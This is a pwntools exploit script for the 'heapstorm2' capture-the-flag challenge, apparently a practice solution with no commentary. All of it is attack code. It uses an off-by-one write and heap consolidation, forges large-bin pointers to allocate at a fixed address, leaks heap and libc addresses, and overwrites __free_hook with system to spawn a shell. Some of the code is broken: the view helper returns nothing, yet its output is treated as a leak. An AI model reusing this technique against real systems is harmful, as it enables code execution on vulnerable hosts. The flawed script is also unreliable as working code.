from pwn import *
context.log_level = 'debug'


def alloc(size):
	sh.sendlineafter('Command: ','1');
	sh.sendlineafter('Size: ',str(size));


def update(idx,size,con):
        sh.sendlineafter('Command: ','2');
        sh.sendlineafter('Index: ',str(idx));
        sh.sendlineafter('Size: ',str(size));
	sh.sendlineafter('Content: ',con);

def free(idx):
	sh.sendlineafter('Command: ','3');
        sh.sendlineafter('Index: ',str(idx));


def view(idx):
        sh.sendlineafter('Command: ','4');


while(True):
	sh = process('./heapstorm2')
	elf = ELF('./heapstorm2')
	libc  = ELF('./libc-2.24.so')


	alloc(0x18)     #0
	alloc(0x508)    #1
	alloc(0x18)     #2
	update(1, 0x4f8,'h'*0x4f0 + p64(0x500))   #set fake prev_size

	alloc(0x18)     #3
	alloc(0x508)    #4
	alloc(0x18)     #5
	update(4, 0x4f8, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
	alloc(0x18)     #6

	free(1)
	update(0, 0xc,'h'*(0x18-12))    #off-by-one

	alloc(0x18)     #1
	alloc(0x4d8)    #7
	free(1)
	free(2)         #backward consolidate

	alloc(0x38)     #1
	alloc(0x4e8)    #2

	#---------again------------
	free(4)
	update(3,0xc,'h'*(0x18-12))    #off-by-one

	alloc(0x18)     #4
	alloc(0x4d8)    #8
	free(4)
	free(5)         #backward consolidate

	alloc(0x48)     #4

	#---------------------------

	free(2)
	alloc(0x4e8)    #2
	free(2)

	storage = 0x13370000 + 0x800
	fake_chunk = storage - 0x20
	 
	p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
	p1 += p64(0) + p64(fake_chunk)      #bk
	update(7,0x30,p1)
	 
	p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
	p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
	p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
	update(8,0x50,p2)
	#--------------------------------
	#gdb.attach(sh)

	try:
	    # if the heap address starts with "0x56", you win
	    alloc(0x48)     #2
	except EOFError:
	    # otherwise crash and try again
	    sh.close()
	    continue

#	gdb.attach(sh)
	st = p64(0)*2 + p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage)
	update(2,0x38,st)

	st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(storage-0x20+3) + p64(8)
	update(0,0x40,st)

	leak = view(1)
	heap = u64(leak)
	print 'heap: %x' % heap

	st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8)
	update(0,0x40,st)

	leak = view(1)
	unsorted_bin = u64(leak)
	main_arena = unsorted_bin - 0x58
	libc_base = main_arena - 0x399b00
	print 'libc_base: %x' % libc_base
	libc_system = libc_base + 0x3f480
	free_hook = libc_base + 0x39b788

	st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(0x100) + '/bin/sh\0'
	update(0,0x58,st)
	update(1,8,p64(libc_system))

	sh.sendline('3')
	sh.recvuntil('Index: ')
	sh.sendline('%d' % 2)
	break
#gdb.attach(sh)

sh.interactive()
